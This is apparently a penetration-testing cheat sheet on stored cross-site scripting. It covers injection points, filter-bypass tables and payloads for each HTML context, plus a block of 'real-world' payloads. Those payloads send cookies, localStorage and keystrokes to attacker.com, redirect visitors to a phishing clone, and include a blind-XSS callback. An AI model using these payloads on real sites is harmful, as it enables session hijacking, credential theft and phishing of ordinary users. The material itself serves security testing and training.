# Stored XSS (Persistent XSS)

## What it is
Your payload is saved to the server (database, log file, user profile, comment, etc.) and served to every user who visits the affected page. No crafted link needed — the payload executes automatically for any victim who loads the page.

**Key trait:** Persistent. Inject once, hit every visitor until the payload is removed.

---

## How it differs from reflected XSS

| Type      | Payload stored? | Who gets hit?  | Requires victim action? |
|-----------|----------------|----------------|------------------------|
| Reflected | No             | One user       | Yes — must click link  |
| Stored    | Yes (DB)       | All visitors   | No — just visit page   |

---

## Where to look (injection vectors)

Any field that gets saved and later displayed to other users:

- **Comments / reviews** — most common, displayed to all visitors
- **Username / display name** — shown in posts, profiles, admin panels
- **Profile fields** — bio, location, website URL
- **Post/article titles or body**
- **Support ticket content** — often visible to admins (high value target)
- **Chat messages**
- **File names** — if the uploaded filename is displayed back
- **HTTP headers** — `User-Agent`, `Referer` if logged and displayed in an admin panel

**Tip:** Think about who sees the stored data. A payload in a support ticket hits admins — much higher value than a public comment hitting regular users.

---

## Basic proof-of-concept payload

```html
<script>alert(1)</script>
```

Inject into any stored field. Navigate away, come back to the page — if the alert fires on page load, it's stored XSS.

---

## Real-world payloads (beyond alert)

```javascript
// Steal session cookie — fires for every visitor
<script>new Image().src='https://attacker.com/steal?c='+document.cookie</script>

// Steal cookie via fetch
<script>fetch('https://attacker.com/steal?c='+document.cookie)</script>

// Exfil localStorage
<script>fetch('https://attacker.com/steal?d='+btoa(JSON.stringify(localStorage)))</script>

// Keylogger — logs everything typed by every visitor
<script>document.onkeypress=function(e){fetch('https://attacker.com/keys?k='+e.key)}</script>

// Admin panel targeting — steal admin's cookie when they view flagged content
<script>new Image().src='https://attacker.com/admin?c='+document.cookie</script>

// Page defacement
<script>document.body.innerHTML='<h1>Hacked</h1>'</script>

// Redirect all visitors to phishing site
<script>window.location='https://evil-clone.com'</script>
```

---

## High-value targets for stored XSS

Not all stored XSS is equal — think about who sees the payload:

| Injection point | Victim | Impact |
|----------------|--------|--------|
| Public blog comment | All visitors | Mass cookie theft |
| Support ticket | Admin/staff | Admin session hijack |
| Username field | Anyone who sees your posts | Broad reach |
| Admin-visible log entry | Admin only | Privilege escalation |
| Product review | All shoppers | Mass phishing/redirect |
| Profile bio | Viewers of your profile | Targeted |

**Rule of thumb:** Target fields that admins or privileged users are likely to view — their cookies are worth more.

---

## Common filters and bypasses

| Filter | Bypass |
|--------|--------|
| Blocks `<script>` | `<img src=x onerror=alert(1)>` |
| Blocks `<script>` | `<svg onload=alert(1)>` |
| Encodes `<` and `>` | Look for attribute context instead |
| Strips `onerror` | `onfocus`, `onmouseover`, `onload` |
| Blocks `alert` | `confirm(1)` or `prompt(1)` |
| Limits field length | Use shorter payload: `<svg onload=alert(1)>` |
| Blocks quotes | Backticks: `` <svg onload=alert`1`> `` |

---

## Context matters (same as reflected)

Where your stored input lands in the HTML changes what payload works:

**HTML body context:**
```html
<p>[YOUR STORED INPUT]</p>
```
→ `<script>alert(1)</script>` or `<img src=x onerror=alert(1)>`

**HTML attribute context:**
```html
<input value="[YOUR STORED INPUT]">
```
→ `" onmouseover="alert(1)` or `"><img src=x onerror=alert(1)>`

**JavaScript string context:**
```html
<script>var name = '[YOUR STORED INPUT]';</script>
```
→ `';alert(1);//`

**href/src attribute:**
```html
<a href="[YOUR STORED INPUT]">link</a>
```
→ `javascript:alert(1)`

---

## Tips for real engagements

- **Test every stored field** — even ones that seem cosmetic (avatar alt text, timezone preference)
- **Check where data is displayed** — the injection point and the execution point are often different pages
- **Think about the audience** — admin panels, moderation queues, and support dashboards are gold
- **Blind stored XSS** — sometimes you can't see where your payload lands (e.g. admin-only pages). Use a callback payload with Burp Collaborator or interactsh to confirm execution:
  ```html
  <script>new Image().src='https://YOUR.COLLABORATOR.NET/?c='+document.cookie</script>
  ```
- **Persistence** — unlike reflected, stored XSS survives page refreshes and hits new victims automatically. Clean up after yourself on real engagements.
